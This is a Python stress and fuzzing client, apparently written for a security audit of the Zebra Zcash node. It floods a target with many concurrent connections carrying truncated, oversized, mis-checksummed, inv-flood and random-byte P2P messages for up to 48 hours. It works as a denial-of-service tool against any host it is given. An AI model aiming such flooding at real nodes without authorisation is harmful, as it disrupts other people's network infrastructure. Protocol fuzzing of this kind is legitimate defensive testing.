#!/usr/bin/env python3
"""
P2P stress client for Zebra security audit.

Opens many simultaneous TCP connections to a Zebra node and sends
interleaved, out-of-order, and truncated P2P message fragments.

Usage:
    python3 p2p_stress_client.py --host 127.0.0.1 --port 8233 \
                                  --connections 200 --duration 172800
"""

import argparse
import hashlib
import random
import socket
import struct
import threading
import time
import logging

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(threadName)s: %(message)s",
)
log = logging.getLogger(__name__)

# ── Zcash P2P constants ───────────────────────────────────────────────────────

MAINNET_MAGIC = bytes([0x24, 0xe9, 0x27, 0x64])
TESTNET_MAGIC = bytes([0xfa, 0x1a, 0xf9, 0xbf])

PROTOCOL_VERSION = 170_100


def sha256d(data: bytes) -> bytes:
    """Double SHA-256."""
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()


def checksum(payload: bytes) -> bytes:
    return sha256d(payload)[:4]


def build_message(command: str, payload: bytes, magic: bytes = MAINNET_MAGIC) -> bytes:
    """Build a complete Zcash P2P message frame."""
    cmd = command.encode("ascii").ljust(12, b"\x00")[:12]
    length = struct.pack("<I", len(payload))
    chk = checksum(payload)
    return magic + cmd + length + chk + payload


def build_version_payload() -> bytes:
    """Build a minimal version message payload."""
    version = struct.pack("<i", PROTOCOL_VERSION)
    services = struct.pack("<Q", 1)  # NODE_NETWORK
    timestamp = struct.pack("<q", int(time.time()))
    addr_recv = b"\x00" * 26
    addr_from = b"\x00" * 26
    nonce = struct.pack("<Q", random.getrandbits(64))
    user_agent = b"\x0f/zebra-audit:0.1/"
    start_height = struct.pack("<i", 0)
    relay = b"\x01"
    return version + services + timestamp + addr_recv + addr_from + nonce + user_agent + start_height + relay


def build_ping_payload() -> bytes:
    return struct.pack("<Q", random.getrandbits(64))


def build_inv_payload(count: int = 1) -> bytes:
    payload = bytes([count])
    for _ in range(count):
        payload += struct.pack("<I", 1)  # MSG_TX
        payload += bytes([random.randint(0, 255) for _ in range(32)])
    return payload


# ── Attack scenarios ──────────────────────────────────────────────────────────

class AttackScenario:
    """Base class for P2P attack scenarios."""

    def __init__(self, sock: socket.socket):
        self.sock = sock

    def run(self):
        raise NotImplementedError


class NormalHandshake(AttackScenario):
    """Perform a normal version/verack handshake."""

    def run(self):
        version_msg = build_message("version", build_version_payload())
        self.sock.sendall(version_msg)
        time.sleep(0.1)
        verack_msg = build_message("verack", b"")
        self.sock.sendall(verack_msg)


class TruncatedMessage(AttackScenario):
    """Send a message truncated at a random byte."""

    def run(self):
        msg = build_message("ping", build_ping_payload())
        truncate_at = random.randint(1, len(msg) - 1)
        self.sock.sendall(msg[:truncate_at])


class OversizedLength(AttackScenario):
    """Send a message with an oversized length field."""

    def run(self):
        cmd = b"ping\x00\x00\x00\x00\x00\x00\x00\x00"
        payload = build_ping_payload()
        chk = checksum(payload)
        # Claim length = 2^31 - 1.
        length = struct.pack("<I", 0x7FFF_FFFF)
        msg = MAINNET_MAGIC + cmd + length + chk + payload
        self.sock.sendall(msg)


class BadChecksum(AttackScenario):
    """Send a message with a corrupted checksum."""

    def run(self):
        msg = bytearray(build_message("ping", build_ping_payload()))
        msg[20] ^= 0xFF  # Flip first checksum byte.
        self.sock.sendall(bytes(msg))


class MassInv(AttackScenario):
    """Send an inv message claiming 50,000 entries."""

    def run(self):
        payload = b"\xfd\x50\xc3"  # compact-size 50000
        for _ in range(50_000):
            payload += struct.pack("<I", 0xFFFF_FFFF)  # unknown type
            payload += bytes(32)
        msg = build_message("inv", payload)
        self.sock.sendall(msg)


class RapidOpenClose(AttackScenario):
    """Open and immediately close the connection."""

    def run(self):
        pass  # Connection is closed immediately after creation.


class InterleavedMessages(AttackScenario):
    """Send multiple message types interleaved without waiting for responses."""

    def run(self):
        messages = [
            build_message("version", build_version_payload()),
            build_message("ping", build_ping_payload()),
            build_message("inv", build_inv_payload(10)),
            build_message("mempool", b""),
            build_message("getaddr", b""),
        ]
        random.shuffle(messages)
        for msg in messages:
            self.sock.sendall(msg)
            time.sleep(random.uniform(0, 0.01))


class RandomBytes(AttackScenario):
    """Send completely random bytes."""

    def run(self):
        size = random.randint(1, 65536)
        self.sock.sendall(bytes([random.randint(0, 255) for _ in range(size)]))


SCENARIOS = [
    NormalHandshake,
    TruncatedMessage,
    OversizedLength,
    BadChecksum,
    MassInv,
    RapidOpenClose,
    InterleavedMessages,
    RandomBytes,
]

# ── Connection worker ─────────────────────────────────────────────────────────

def connection_worker(host: str, port: int, stop_event: threading.Event, worker_id: int):
    """Worker thread that repeatedly connects and runs attack scenarios."""
    while not stop_event.is_set():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(5.0)
                sock.connect((host, port))

                scenario_cls = random.choice(SCENARIOS)
                scenario = scenario_cls(sock)
                scenario.run()

                # Hold the connection open for a random duration.
                hold_time = random.uniform(0, 2.0)
                time.sleep(hold_time)

        except (ConnectionRefusedError, OSError, socket.timeout):
            time.sleep(0.5)
        except Exception as e:
            log.debug(f"Worker {worker_id}: {e}")
            time.sleep(0.1)


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Zebra P2P stress client")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8233)
    parser.add_argument("--connections", type=int, default=200)
    parser.add_argument("--duration", type=int, default=172800)
    args = parser.parse_args()

    log.info(f"Starting P2P stress test: {args.connections} connections to {args.host}:{args.port}")
    log.info(f"Duration: {args.duration}s")

    stop_event = threading.Event()
    threads = []

    for i in range(args.connections):
        t = threading.Thread(
            target=connection_worker,
            args=(args.host, args.port, stop_event, i),
            name=f"worker-{i:04d}",
            daemon=True,
        )
        t.start()
        threads.append(t)

    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        log.info("Interrupted by user.")

    log.info("Stopping all workers...")
    stop_event.set()

    for t in threads:
        t.join(timeout=5.0)

    log.info("Stress test complete.")


if __name__ == "__main__":
    main()
